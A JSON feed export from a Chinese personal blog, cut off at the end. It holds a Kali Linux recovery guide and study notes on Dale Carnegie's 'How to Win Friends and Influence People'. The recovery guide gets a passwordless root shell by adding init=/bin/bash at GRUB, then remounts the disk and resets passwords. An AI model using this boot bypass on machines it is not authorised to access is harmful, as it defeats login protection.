{
    "version": "https://jsonfeed.org/version/1",
    "title": "sqrt7",
    "description": "",
    "home_page_url": "https://w-sqrt7.github.io",
    "items": [
        {
            "id": "https://w-sqrt7.github.io/2024/09/21/other/basic/kali%E4%BD%BF%E7%94%A8%E5%8D%95%E7%94%A8%E6%88%B7%E6%A8%A1%E5%BC%8F/",
            "url": "https://w-sqrt7.github.io/2024/09/21/other/basic/kali%E4%BD%BF%E7%94%A8%E5%8D%95%E7%94%A8%E6%88%B7%E6%A8%A1%E5%BC%8F/",
            "title": "",
            "date_published": "2024-09-21T11:40:45.518Z",
            "content_html": "<h3 id=\"使用单用户模式\"><a href=\"#使用单用户模式\" class=\"headerlink\" title=\"使用单用户模式\"></a>使用单用户模式</h3><p>如果你可以以单用户模式登录，可以尝试从单用户模式恢复文件。</p>\n<ol>\n<li><p><strong>重启系统</strong>： 重启你的计算机。</p>\n</li>\n<li><p><strong>进入 GRUB 菜单</strong>： 在启动过程中，当GRUB菜单出现时，选择 “Advanced options for Kali Linux”。在启动过程中，当GRUB（GRand Unified Bootloader）菜单出现时，选择你通常启动的Kali Linux内核条目，但不要按回车键进入。</p>\n</li>\n<li><p><strong>编辑启动选项</strong>： 在高亮显示的内核条目上，按<code>e</code>键编辑启动选项。</p>\n</li>\n<li><p><strong>修改内核启动行</strong>： 使用上下箭头键找到以<code>linux</code>开头的那一行。在这一行的末尾，添加以下参数：</p>\n<figure class=\"highlight text\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">init=/bin/bash</span><br></pre></td></tr></table></figure>\n\n<p>确保不要添加任何前缀空格，但要在现有的<code>ro</code>或其他参数后添加一个空格，然后再添加<code>init=/bin/bash</code>。</p>\n</li>\n<li><p><strong>进入单用户模式</strong>： 完成上述配置后按下<code>ctrl + X</code>或<code>F10</code>启动系统系统将启动到一个单用户模式的root shell。，。</p>\n</li>\n<li><p><strong>挂载文件系统为读写模式</strong>： 在单用户模式下，文件系统默认是只读的，需要重新挂载为读写模式：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mount -o remount,rw /</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><strong>恢复原始文件或重置密码</strong>： 使用Live CD&#x2F;USB或其他方式获取原始文件，并替换更改的文件。你可以使用 <code>cp</code> 命令从Live环境复制文件到系统中。</p>\n</li>\n<li><p><strong>重启系统</strong>： 执行 <code>reboot -f</code> 命令重启系统。</p>\n</li>\n</ol>\n<h3 id=\"检查文件系统状态\"><a href=\"#检查文件系统状态\" class=\"headerlink\" title=\"检查文件系统状态\"></a>检查文件系统状态</h3><p>首先，你需要检查文件系统的状态。运行以下命令来查看文件系统的挂载状态：</p>\n<p>bash</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mount | grep <span class=\"string\">&quot; on / &quot;</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"重新挂载文件系统为读写模式\"><a href=\"#重新挂载文件系统为读写模式\" class=\"headerlink\" title=\"重新挂载文件系统为读写模式\"></a>重新挂载文件系统为读写模式</h3><p>如果文件系统被挂载为只读，你可以尝试重新挂载为读写模式。使用以下命令：</p>\n<p>bash</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo mount -o remount,rw /</span><br></pre></td></tr></table></figure>\n\n<p>这条命令会尝试重新挂载根文件系统为读写模式。如果成功，你可以再次尝试更改权限。</p>\n<h3 id=\"检查文件系统错误\"><a href=\"#检查文件系统错误\" class=\"headerlink\" title=\"检查文件系统错误\"></a>检查文件系统错误</h3><p>如果文件系统被挂载为只读，可能是因为有未处理的错误。运行文件系统检查：</p>\n<p>bash复制</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo fsck -f /</span><br></pre></td></tr></table></figure>",
            "tags": []
        },
        {
            "id": "https://w-sqrt7.github.io/2024/07/20/philosophy/%E4%BA%BA%E6%80%A7%E7%9A%84%E5%BC%B1%E7%82%B9/",
            "url": "https://w-sqrt7.github.io/2024/07/20/philosophy/%E4%BA%BA%E6%80%A7%E7%9A%84%E5%BC%B1%E7%82%B9/",
            "title": "",
            "date_published": "2024-07-20T14:15:26.179Z",
            "content_html": "<h1 id=\"人性的弱点\"><a href=\"#人性的弱点\" class=\"headerlink\" title=\"人性的弱点\"></a>人性的弱点</h1><h2 id=\"1-与人相处的基本技巧\"><a href=\"#1-与人相处的基本技巧\" class=\"headerlink\" title=\"1.与人相处的基本技巧\"></a>1.与人相处的基本技巧</h2><h3 id=\"永远不要批评斥责抱怨他人\"><a href=\"#永远不要批评斥责抱怨他人\" class=\"headerlink\" title=\"永远不要批评斥责抱怨他人\"></a>永远不要批评斥责抱怨他人</h3><p>无论一个人犯了何种错误，第一反应永远不会是自责</p>\n<p>批评斥责只会伤害其自尊，引起强烈的反抗</p>\n<p>人类的天性，只会责怪别人，不会责怪自己，每个人都是如此</p>\n<p>批评他人很容易给自己引来麻烦</p>\n<h3 id=\"真诚的赞美他人\"><a href=\"#真诚的赞美他人\" class=\"headerlink\" title=\"真诚的赞美他人\"></a>真诚的赞美他人</h3><p>若希望一个人按照你的要求做事，最好的方法就是满足他的需求</p>\n<p>对任何人来讲，赞美都比批评更有效，更容易激发对方的热情</p>\n<p>所有人都喜欢别人恭维自己，在人类的天性中，最深层的本质就是渴望得到别人的重视和关注</p>\n<p>赞美不同于谄媚，谄媚如假钞，赞美如甘露，基于真诚的赞美</p>\n<p>发现别人的优点真诚的赞美他人</p>\n<h3 id=\"激发他人的强烈需求\"><a href=\"#激发他人的强烈需求\" class=\"headerlink\" title=\"激发他人的强烈需求\"></a>激发他人的强烈需求</h3><p>唯一能够影响他人的方法就是讨论他的需求，然后告诉他如何才能满足这种需求</p>\n<p>掌握对方迫切的需求便能如鱼得水，事半功倍</p>\n<p>钓人如钓鱼，要投其所好，挂上鱼儿喜欢吃的东西</p>\n<p>每个人都值关心自己的需求，对他人的需求并不感兴趣，讨论他的需求，然后告诉他如何才能满足这种需求</p>\n<p>站在对方的立场考虑问题，抓住对方的需求</p>\n<h2 id=\"2-如何让他人喜欢你\"><a href=\"#2-如何让他人喜欢你\" class=\"headerlink\" title=\"2.如何让他人喜欢你\"></a>2.如何让他人喜欢你</h2><h3 id=\"真诚的关心\"><a href=\"#真诚的关心\" class=\"headerlink\" title=\"真诚的关心\"></a>真诚的关心</h3><p>一个人通过真诚测关心他人，即便是最忙碌的著名人士，依然能够占用他们的时间，获得与他们合作的机会</p>\n<p>无论是知名人士还是普通人，大家都喜欢尊重自己的人</p>\n<h3 id=\"微笑待人\"><a href=\"#微笑待人\" class=\"headerlink\" title=\"微笑待人\"></a>微笑待人</h3><p>人际交往中，真正发自内心的微笑有着很重要的作用</p>\n<p>爱微笑的人往往比不爱微笑的人更受欢迎</p>\n<h3 id=\"记住他人的名字\"><a href=\"#记住他人的名字\" class=\"headerlink\" title=\"记住他人的名字\"></a>记住他人的名字</h3><p>每个人都很重视自己的名字，所以记住别人的名字，是一种礼貌，不仅能获得别人的好感，还能让你有意想不到的收获</p>\n<p>无论在商业中还是政治中，牢记他人的名字都是很重要的事情</p>\n<p>牢牢记住所接触的每一个人的名字</p>\n<h3 id=\"善于倾听他人讲话\"><a href=\"#善于倾听他人讲话\" class=\"headerlink\" title=\"善于倾听他人讲话\"></a>善于倾听他人讲话</h3><p>如果想要获得别人的好感，善于倾听对方讲话时很重要的事情，这是对他的最高恭维</p>\n<p>不认真听别人讲话，而是不断谈论自己的事情，只会让别人厌恶你，轻视你</p>\n<p>不要打断别人的话，注意听对方说话的重点，适当发表自己的意见，关注他人的需求，忽略自己的感受与</p>\n<h3 id=\"谈论他人的兴趣\"><a href=\"#谈论他人的兴趣\" class=\"headerlink\" title=\"谈论他人的兴趣\"></a>谈论他人的兴趣</h3><p>最容易接近别人心灵的方法就是谈论他人感兴趣的话题，这可以让自己成为一个深受欢迎的人</p>\n<p>拓宽自己的知识面，增加自己与他人谈论的接触面</p>\n<p>谈论对方感兴趣的话题，要适当发表自己的意见，保证自己说出的信息是准确的</p>\n<p>不要刻意的讨论对方感兴趣的事情，而是在无意间提起，如果刻意，只会引起反效果</p>\n<p>真诚的表现出自己的兴趣，对于有用的人，越是值得接近的人，越努力的研究他人的兴趣，并牢记这些知识，以便深入交谈</p>\n<h3 id=\"满足他人的自重感\"><a href=\"#满足他人的自重感\" class=\"headerlink\" title=\"满足他人的自重感\"></a>满足他人的自重感</h3><p>人际交往中的重要法则，尊重别人，让对方获得自重感</p>\n<p>人类最深层的欲望就是得到别人的重视</p>\n<p>己所不欲勿施于人，己所欲者亦施于人</p>\n<h2 id=\"3-如何赢得他人的赞同\"><a href=\"#3-如何赢得他人的赞同\" class=\"headerlink\" title=\"3.如何赢得他人的赞同\"></a>3.如何赢得他人的赞同</h2><h3 id=\"不要与他人争论\"><a href=\"#不要与他人争论\" class=\"headerlink\" title=\"不要与他人争论\"></a>不要与他人争论</h3><p>喜欢和别人争论，反驳别人的观点，可能赢得一时的胜利，但这毫无价值，永远无法获得对方的好感</p>\n<p>避免争论往往能获得最大的胜利</p>\n<h3 id=\"永远不要指责他人的错误\"><a href=\"#永远不要指责他人的错误\" class=\"headerlink\" title=\"永远不要指责他人的错误\"></a>永远不要指责他人的错误</h3><p>即便你比他人聪明，也绝对不能告诉对方你比他聪明</p>\n<p>承认自己的错误之处，不仅能避免争论，还能让对方同样“大度”</p>\n<p>即便你指出别人的错误，对方也不一定会认同你，同时还会引起对方的反抗，即便与他辩论，讲道理，依旧无法改变他的观点，因为你对他的自尊造成了伤害</p>\n<h3 id=\"用于承认自己的错误\"><a href=\"#用于承认自己的错误\" class=\"headerlink\" title=\"用于承认自己的错误\"></a>用于承认自己的错误</h3><p>承认自己可能的错误，能够避免与人争论，还有利于解决问题，更容易达到目的</p>\n<p>如果你是对的，使用相对温和的语气让对方赞同你的观点，使用巧妙的方式让别人赞同我们的观点</p>\n<h3 id=\"善待他人\"><a href=\"#善待他人\" class=\"headerlink\" title=\"善待他人\"></a>善待他人</h3><p>每个人都有自己的想法，且很难强迫他们改变自己的想法来赞同你的观点</p>\n<p>如果想让别人赞同你的观点，就需要友善的对待他，让他相信你真正的将他当作朋友</p>\n<p>友善待人，用温和的态度赢得别人的心</p>\n<h3 id=\"站在对方的立场思考问题\"><a href=\"#站在对方的立场思考问题\" class=\"headerlink\" title=\"站在对方的立场思考问题\"></a>站在对方的立场思考问题</h3><p>在与人交往时，不要将自己的观点强加给别人，而是从对方的立场思考问题</p>\n<p>只有从别人的角度看问题，了解对方的思想，才能在为人处世中创造奇迹，获得对方好感</p>\n<p>不要牢记别人的错误，不要轻易的职责别人，只有傻子才会那样做</p>\n<p>对方的所言所行有他自己的道理，如果能找到那个原因，便掌握了理解他们的钥匙</p>\n<p>尝试思考：如果我是他，我会有什么感受，又会做出何种反应</p>\n<p>站在对方的角度思考，有什么理由能够让他这样做</p>\n<h3 id=\"充分理解他人的感受\"><a href=\"#充分理解他人的感受\" class=\"headerlink\" title=\"充分理解他人的感受\"></a>充分理解他人的感受</h3><p>有一句神奇的话：我一点也不奇怪你有那样的感受，如果我是你的话，我的感受也是一样的</p>\n<p>在消除他人的恶感时，感同身受有着很重要的作用</p>\n<p>相互理解时困难的，不能理解才是正常的</p>\n<h2 id=\"4-如何改变他人的观点\"><a href=\"#4-如何改变他人的观点\" class=\"headerlink\" title=\"4.如何改变他人的观点\"></a>4.如何改变他人的观点</h2><h3 id=\"强调彼此的共同点\"><a href=\"#强调彼此的共同点\" class=\"headerlink\" title=\"强调彼此的共同点\"></a>强调彼此的共同点</h3><p>如果你一开始就赞同对方的观点，便会营造一种和谐的谈话气氛，有利于实现你的目标。这时候，对方也容易放弃自己的偏见，转而赞同你的意见。</p>\n<p>如果想要让对方赞同你的观点，你需要做的是抓住谈话的共同点，然后强调这个共同点</p>\n<p>让一个人想要做某件事的方法是，让他认为你的说法是正确的，他是在做正确的事情。</p>\n<p>当你在说服别人时，如果能让对方在一开始就回答“是”，那么，你就成功了一半；如果能够引导看对方一直回答“是”，那么，你就成功了90%</p>\n<p>如果在谈话中，对方一开始就说“不”，即使你说得再多，依然很难改变他的观点。这时候，你需要做的是改变话题，或者改变谈话方式。先讨论双方都赞同的话题，然后逐渐进入有分的部分，在分岐中寻找双方都能接受的部分，慢慢减少彼此之间的分，最后说服对方。</p>\n<p>说服对方的过程中注意以下两点：</p>\n<pre><code>#第一，提问的方式\n哪种提问方式更容易得到肯定的回答呢？最好是带有暗示性的方式。例如，当推销员向顾客推销某个商品时，如果问顾客“喜不喜欢”或者“想不想要”，便很可能得到否定的回答。如果推销员说：“你一定很喜欢这个东西，是吗？这样获得肯定回答的几率就会高很多。\n#第二，提问的内容\n除了提问的方式之外，提问的内容也是非常重要的。例如，推销员询问顾客“今天的天气很好，是吗？”“最近的通货膨胀很严重，治安很混乱，是吗？等问题，虽然都能得到肯定的回答，但无法创造出和谐的谈话气氛，甚至会让顾客觉得庆烦。这样一来，肯定无法实现自己的目的了。\n</code></pre>\n<p>当我们在说服对方时，一定要想办法让对方回答“是”，引领着他一步步靠近我们的观点因此</p>\n<p>强调彼此的共同点，寻找让对方回答“是”的问题。</p>\n<h3 id=\"给予他人说话的机会\"><a href=\"#给予他人说话的机会\" class=\"headerlink\" title=\"给予他人说话的机会\"></a>给予他人说话的机会</h3><p>如果想要说服他人，便努力为对方创造说话的机会</p>\n<p>即使是最顽固的人，当你耐心地倾听他说话时，他的态度也会逐渐地软化下来</p>\n<p>为了让他人赞同自己的观点，许多人都容易犯相同的错误：说话太多。</p>\n<h3 id=\"先称赞，后责备\"><a href=\"#先称赞，后责备\" class=\"headerlink\" title=\"先称赞，后责备\"></a>先称赞，后责备</h3><p>当我们听完别人的称赞之后，再去听别人的批评，心里也会好受一些。</p>\n<p>如果用争论的方法不能说服对方，你可以尝试一下称赞的方法，或许会让对方放弃自己的观点，转而接受你的观点。</p>\n<h3 id=\"鼓励更容易让人改正错误\"><a href=\"#鼓励更容易让人改正错误\" class=\"headerlink\" title=\"鼓励更容易让人改正错误\"></a>鼓励更容易让人改正错误</h3><p>当你告诉孩子、丈夫或者员工，他在某件事情上毫无天分，无论付出多少努力都无法成功时，你就打破了他的上进心如果你鼓励他、支持他，他就会有信心完成你的要求</p>\n<p>任何人都会犯错误，但每个人都喜欢被表扬，而不喜欢被批评。只要被批评就会产生消极情绪，而获得表扬就会信心十足。因此，在指出<br> 别人的错误时需要一定的技巧。</p>\n<p>一般来说，我们 要尽量委婉地指出别人的错误，避免直接的批评和攻击，否则不仅无法使对方意识到所犯的错误，还会使他产生逆反心理，难以接受你的批评。最好是用鼓励和赞赏的方法指出别人的错<br>误，让对方容易接受，而且不会产生逆反心理。</p>\n<h3 id=\"委婉的指出他人的错误\"><a href=\"#委婉的指出他人的错误\" class=\"headerlink\" title=\"委婉的指出他人的错误\"></a>委婉的指出他人的错误</h3><p>任何人在面对直接的批评时，都会产生强烈的反感；如果能够巧妙地让他人意识到自己的错误，并给出建议的话对方就会很乐意接受</p>\n<p>当你希望别人满足你的期望时，在赞扬他之后，千万不要说“但是”，而是要说“而且”，这两个词能够产生截然不同的效果。</p>\n<h3 id=\"先责己，后责人\"><a href=\"#先责己，后责人\" class=\"headerlink\" title=\"先责己，后责人\"></a>先责己，后责人</h3><p>即使一个人还没有改正自己的错误，但只要能够认识到自己的错误，便有助于帮助他改善自己的行为。</p>\n<p>如果批评者首先承认自己的错误，然后再指责他人的错误，那么，情况就会好很多。</p>\n<h2 id=\"5-如何激励他人的行为\"><a href=\"#5-如何激励他人的行为\" class=\"headerlink\" title=\"5.如何激励他人的行为\"></a>5.如何激励他人的行为</h2><h3 id=\"激发他人高尚的动机\"><a href=\"#激发他人高尚的动机\" class=\"headerlink\" title=\"激发他人高尚的动机\"></a>激发他人高尚的动机</h3><p>所有人都是理想主义者，都希望自己所做的事情有一个动听的理由。因此，如果你能激发出他人的高尚动机，便很容易实现自己的目标。</p>\n<p>即使是那些有意欺骗你的人，如果你能让他相信他是一个诚实、善良、正直的人，在大多数情况下，他都会朝着这个目标努力，达成你的期望</p>\n<h3 id=\"激发他人竞争的欲望\"><a href=\"#激发他人竞争的欲望\" class=\"headerlink\" title=\"激发他人竞争的欲望\"></a>激发他人竞争的欲望</h3><p>竞争意识存在于强烈的自重感中，这是一个人不甘落后于人的最佳体现。</p>\n<p>每一个成功的人士都喜欢竞争，因为这是他表现自己的机会，更是证明他的能力和价值的平台</p>\n<p>无论是在生物界，还是在人类社会中，都存在着竞争。只要目的和方式都正当的竞争，便有利于增强人们的能力，从而提高效率</p>\n<h3 id=\"称赞他人的进步\"><a href=\"#称赞他人的进步\" class=\"headerlink\" title=\"称赞他人的进步\"></a>称赞他人的进步</h3><p>如果我们愿意激励所接触到的每一个人，帮助他挖掘出内在的潜力，那么，不仅能够使其进步，甚至会改变他的一生。</p>\n<p>称赞对方的进步，即使是微不足道的进步，对方也会铭记在心，并激励着自己走向成功</p>\n<p>所有人都渴望得到称赞和认同，而且会尽力得到它，但几乎没有人喜欢阿奉承</p>\n<h3 id=\"让他人拥有一个好名声\"><a href=\"#让他人拥有一个好名声\" class=\"headerlink\" title=\"让他人拥有一个好名声\"></a>让他人拥有一个好名声</h3><p>如果你希望某个人拥有一种美德，你可以公开宣称他已经拥有这种美德了，尽管他确实没有。给他一个好名声，让他为此去奋斗，他就会竭尽全力去做，绝对不想令你失望</p>\n<p>对于普通人来说，如果他能够尊重你，而你也对他的某种能力表示肯定，那么，他就愿意服从你的命令。</p>\n<p>如果你希望一个人在某方面有所改变，必须承认他在这方面已经很优秀了。莎士比亚曾说：“如果你没有一种美德你必须认为自己已经有了。</p>\n<p>在心理学中的期待效应”，是指我们在人际交往中，如果想要让对方达到某个目标，必须对对方寄予某种期望，还要用语言将这种期望表示出来，让对方知道你的期望，这样能够让对方更容易达成目标。</p>\n<p>有句古语说：“如果人背了恶名，还不如一死了之。无论是穷人、富人，还是、强盗，所有人都希望自己有一个好名声</p>\n<h3 id=\"善于向他人授权\"><a href=\"#善于向他人授权\" class=\"headerlink\" title=\"善于向他人授权\"></a>善于向他人授权</h3><p>如果你希望别人高高兴兴地去做你让他做的事情，那么，你就需要让他明白，他对你来说是很重要的。这样一来，他也会认为自己是无可替代的，从而满足你的要求。</p>\n<p>当你对他人有所求时，你可以采用委婉、欣赏的方式这样他更容易答应你的请求。</p>\n<p>人类的自重感是为了满足本性的需求，由内部自重和外部自重两部分组成。内部自重指的是每个人都希望拥有实力、充满自信、独立自主，也就是我们所谓的自尊；外部自重指的是人们对于社会地位、自身威望的渴求，希望能够得到他人的尊重和信任。</p>\n<p>从个人心理学角度来说，当一个人被授予某种头衔时，他对自己的认知就会发生变化。在潜意识中，他会将自己与头衔联系在一起，按照头衔的要求做事，否则他的认知就会失调，也就是认识与言行之间产生矛盾冲突，从而觉得很不适应。因此，为了避免这种情况，他一定会用实际行动维护这个头街带给自己的荣誉</p>\n<h3 id=\"真诚地请求他人帮忙\"><a href=\"#真诚地请求他人帮忙\" class=\"headerlink\" title=\"真诚地请求他人帮忙\"></a>真诚地请求他人帮忙</h3><p>每一个人都希望被人欣赏、被人尊重，甚至会使用各种方法实现这个目标。</p>\n<p>请求别人为你做事，不仅能够让对方产生自重、高贵的感觉，还能激发出对方的创造力，让你拥有意想不到的收获。</p>\n<p>在这里，我需要强调一点，有些人会机械地运用这个规则。虽然我们需要激发出对方的自重感和高贵感，但不是通过馅媚或者虚伪的方式，如果出发点是错误的，绝对不会产生理想的效果。</p>\n<p>虽然每个人都希望得到他人的赞赏和尊重，但任何人都不会接受馅媚、虚伪的奉承。</p>\n<h2 id=\"6-如何获得他人的好感\"><a href=\"#6-如何获得他人的好感\" class=\"headerlink\" title=\"6.如何获得他人的好感\"></a>6.如何获得他人的好感</h2><h3 id=\"被容纳是每个人的渴望\"><a href=\"#被容纳是每个人的渴望\" class=\"headerlink\" title=\"被容纳是每个人的渴望\"></a>被容纳是每个人的渴望</h3><p>每个人都希望自己能够被他人接受，可以轻松地与他人相处，这是所有人内心的深切渴望</p>\n<p>问候不仅是一种礼貌，也是一种安感，而且能够缩短人们之间的距离，让人与人之间的关系更加紧密。因此，问候是表达友善的一种方式。</p>\n<p>给身边的人送去问候，不仅打开了自己尘封的心灵，也会给别人带来温暖。问候是一种礼貌，也是一种安感，能够缩短人们之间的距离，让人们更加亲密。因此，问候是表达友善的一种方式。</p>\n<h3 id=\"学会尊重他人\"><a href=\"#学会尊重他人\" class=\"headerlink\" title=\"学会尊重他人\"></a>学会尊重他人</h3><p>每个人都会维护自己的尊严，给予他一种自重感，他就会忠诚于你，而不会背叛。</p>\n<p>无礼的命令只会招来他人的恨，即使这种命令能够改正他人的错误。</p>\n<p>任何人都有自尊心，所以你在维护自己的自尊心时，千万不能伤害到他人的自尊心。尊重是相互的，只有尊重别人，才能够得到别人的尊重。</p>\n<p>人类是一种奇怪的动物，而且有着强烈的自尊心，他们可以在暗地里吃亏，也可以在明面上吃亏，但就是不能在自尊心上吃亏</p>\n<p>如果想要对他人产生影响的话，一定要学会从对方的角度考虑问题，满足对方的自尊心。这样，对方才会去做你希望他做的事情，而且不会背你。</p>\n<h3 id=\"请求别人批评自己\"><a href=\"#请求别人批评自己\" class=\"headerlink\" title=\"请求别人批评自己\"></a>请求别人批评自己</h3><p>每个人每天至少有五分钟是一个大笨蛋，所谓的智慧就是如何不超过这五分钟的限制</p>\n<p>那些反对你、指责你、阻碍你的人都是你的导师，你可以从他们那里学到更多的定西。</p>\n<p>既然每个人都会做错事和事，为什么要在意别人的批评呢<br>愚蠢的人受到批评时会反、发气，但聪明人会从批评者身上学到自己没有的东西。</p>\n<p>著名诗人惠特曼曾说：“难道你只会从慕你、恭维你的人身上学习知识吗？那些反对你、批评你、指责你的人不是能让你学到更多吗？”罗契方卡也说：“敌人的意见要比我们自己的意见更加接近事实。</p>\n<h3 id=\"拥抱对手\"><a href=\"#拥抱对手\" class=\"headerlink\" title=\"拥抱对手\"></a>拥抱对手</h3><p>如果我们的对手知道他们能够让我们伤心、烦恼的话他们一定会很开心，因为这种痛苦无法伤害他们，但会伤害我们自己。</p>\n<p>我们要学着关爱自己的对手，这样不仅能够化干戈为玉，赢得对手的好感，还会给自己带来快乐</p>\n<p>莎士比亚曾说：“不要让你的对手在你心中点燃一把火，则烧伤得只能是你自己。“</p>\n<h3 id=\"人的本性是容易忘记感恩\"><a href=\"#人的本性是容易忘记感恩\" class=\"headerlink\" title=\"人的本性是容易忘记感恩\"></a>人的本性是容易忘记感恩</h3><p>忘记感谢是人的本性，假如我们一直期望别人感恩的话，大多数都是自寻烦恼。</p>\n<p>想要获得真正的快乐， 就必须抛弃别人会不会感激你的念头，只享受付出的快乐。</p>\n<p>我们不要试着指望别人报答，当偶尔得到了别人的感激的时候，就会是一种惊喜，而得不到也不会为此难过。</p>\n<h2 id=\"7-如何让你变得更加成熟\"><a href=\"#7-如何让你变得更加成熟\" class=\"headerlink\" title=\"7.如何让你变得更加成熟\"></a>7.如何让你变得更加成熟</h2><h3 id=\"勇于承担责任\"><a href=\"#勇于承担责任\" class=\"headerlink\" title=\"勇于承担责任\"></a>勇于承担责任</h3><p>让自己变得成熟的第一步就是勇于承担责任。我们都早已摆脱了自己跌倒将责任推给桌椅的孩童时代，我们应该勇敢地面对人生，学会对自己负责。</p>\n<p>一个希望自己变得成熟的人一定要记得，对自己的所作所为负责，勇于承担责任，而不是寻找借口</p>\n<h3 id=\"拥有坚定的信念\"><a href=\"#拥有坚定的信念\" class=\"headerlink\" title=\"拥有坚定的信念\"></a>拥有坚定的信念</h3><p>除了勇于承担责任之外，我们还要拥有坚定的信念，否则所有的理论都将化为泡影</p>\n<p>我们的信念是否能够发挥作用，关键不在于如何去想而是如何去做。基督耶曾说：“观其果而知其因”，重要的是如何去做。</p>\n<p>如果我们不采取行动的话，再坚定的信念也会毫无作用，我们的生活会充满虚伪，变得不再真实。因此，如果我们拥有坚定的信念，便认真地做好每一件事。</p>\n<h3 id=\"做独一无二的自己\"><a href=\"#做独一无二的自己\" class=\"headerlink\" title=\"做独一无二的自己\"></a>做独一无二的自己</h3><p>每个人都是独一无二的，虽然构成人体的基因相同，但每个人的生命都是独成一体，各不相同</p>\n<p>每天都要为自己创造一段独处的时光，抛弃所有的事物，拒接所有的电话，这是我们探索自己、了解自己必须要做的事情。</p>\n<p>只有了解了自己，才能更好地了解别人</p>\n<p>一 、在独处中认识自己<br>随着生活节奏的加快，我们能够沉思的时间越来越少了。在这种情况下，我们更应该给自己留出一些独处的时间，为自己创造反省的机会，以便进一步认识自己。当然，每个人都拥有自己的独处方式。</p>\n<p>二、摆脱习惯的柳锁<br>我们都将自己理在了习惯和无聊的事物中，只有通过最大的努力才能挣脱出来</p>\n<p>三、挖掘生活中令自己满意的东西<br>如果想要评价一个人的人格，最佳的时机是他处于最活跃、最满意的状态，这时他内心的想法是这才是真正的我。也就是说，当人们处于兴奋状态时，真正的自我就会浮现出来。</p>\n<p>虽然一个人的个性难以改变，但可以通过某些行为表现出与众不同的特征。如果想要展示出真正的自我，便需要除掉内心深处的恐惧、缩、猜疑、迷茫、恶习等，而兴奋就是除掉这些东西的良药。</p>\n<h3 id=\"学会喜欢自己\"><a href=\"#学会喜欢自己\" class=\"headerlink\" title=\"学会喜欢自己\"></a>学会喜欢自己</h3><p>我们要喜欢、尊重、欣赏自己，这不仅可以培养出健康成熟的个性，还可以提高我们人际交往的能力</p>\n<p>如果想要获得进步、突出自我，就要及时纠正自己的错误，发挥自己的优点，展现出自己最优秀的一面。</p>\n<p>在日常生活中，如果我们自己都不喜欢自己，那么很难期待别人会喜欢与我们在一起。</p>\n<h3 id=\"坚持自我本色\"><a href=\"#坚持自我本色\" class=\"headerlink\" title=\"坚持自我本色\"></a>坚持自我本色</h3><p>尽可能站在他人的角度看待问题，但是千万不要因此就失去自己的观点。</p>\n<p>每个人生命的真正意义，就是要把自身所具有的各种才能发挥出来</p>\n<p>假如一个人完全顺从和超利避害的话，这个人就会变成奴。只有那些勇于接受生活挑战，投入到生活中去努力奋斗的人，才能获得真正的自由</p>\n<h3 id=\"争取并珍爱友谊\"><a href=\"#争取并珍爱友谊\" class=\"headerlink\" title=\"争取并珍爱友谊\"></a>争取并珍爱友谊</h3><p>获得友谊的最好办法，就是注重给予，而不是收获</p>\n<p>究竟用什么方法能够赢得别人的喜欢呢？答案其实很简单，那就是待人诚恳、热爱生活。</p>\n<p>与人相处时，不要担心别人是否喜欢我们，而是要用心待人，培养能让别人喜欢你的品质</p>\n<p>在这个世界上，每个人都有自己独立的人格，没有人会毫无缘由的喜欢你。你有什么特殊的理由让别人喜欢你，并与你成为朋友呢？</p>\n<p> 无论是在生活中，还是在工作中，我们都必须端正自己的心态，不断地提升自已的人格魅力，这样才能使自己具备招人喜欢的特质和品行，才能赢得他人的关注和青睐。</p>\n<p>中国的思想家孔子，曾经这样说过：“不惠人之不已知，惠不能也。意思是说，在生活中最重要的，并不是别人有没有爱我们，而是我们值不值得被别人爱。</p>\n<p>假如你想要赢得别人的友谊或感情的话，没必要先担心别人是不是喜欢我们，而是应该不断提升自己值得别人喜欢的品质。</p>\n<h2 id=\"8-如何让你的家庭变得幸福\"><a href=\"#8-如何让你的家庭变得幸福\" class=\"headerlink\" title=\"8.如何让你的家庭变得幸福\"></a>8.如何让你的家庭变得幸福</h2><h3 id=\"不要自掘婚姻的坟墓\"><a href=\"#不要自掘婚姻的坟墓\" class=\"headerlink\" title=\"不要自掘婚姻的坟墓\"></a>不要自掘婚姻的坟墓</h3><p>地狱中的魔鬼，发明了很多种毁灭爱情的烈火，其中喋喋不休是最致命的，它带给婚姻的永远只有悲剧</p>\n<p>即便贵为一国之母，拥有全世界最美丽的面孔，也不要对自己的喋喋不休，这种只会给婚姻挖掘坟墓。</p>\n<h3 id=\"不要用爱的名义改变对方\"><a href=\"#不要用爱的名义改变对方\" class=\"headerlink\" title=\"不要用爱的名义改变对方\"></a>不要用爱的名义改变对方</h3><p>一段成功的婚姻，不仅取决于你寻找的那个配偶，还取决于在这段婚姻中，你自已该如何做一个好的配偶。</p>\n<p>假如你想拥有快乐的家庭生活，请记住，千万不要试图用爱的名义改造你的伴侣。</p>\n<h3 id=\"不要批评家人\"><a href=\"#不要批评家人\" class=\"headerlink\" title=\"不要批评家人\"></a>不要批评家人</h3><p>50%以上婚姻失败的原因，就是那些无用的、令人心碎的批评。</p>\n<p>不要对家人要求太刻，每当你想批评他们的时候，假装温柔一点，你会得到意想不到的效果</p>\n<h3 id=\"真诚地欣赏对方\"><a href=\"#真诚地欣赏对方\" class=\"headerlink\" title=\"真诚地欣赏对方\"></a>真诚地欣赏对方</h3><p>在这个世界上，无论是男人还是女人，都渴望得到别人的赞赏和热爱。假如对方能够衷心地表示赞赏和热爱的话，他就会得到幸福和快乐</p>\n<p>请男人们记住，男人真诚的赞美会使女人获得安全感得到心理的满足，所以她们对干那些称赞过自己的男士的印象最为深刻</p>\n<p>请所有的女士记住，你的丈夫无论长得美丑、事业是否成功，他都希望自己在你眼里是最棒的，你的赞美就是赢得他内心的关键。</p>\n<h3 id=\"细微之处见真情\"><a href=\"#细微之处见真情\" class=\"headerlink\" 